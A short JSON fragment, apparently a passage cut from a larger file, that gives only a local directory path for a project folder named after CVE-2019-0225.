  "path": "/home/wtwhite/code/xshady/CVE-2019-0225"
}
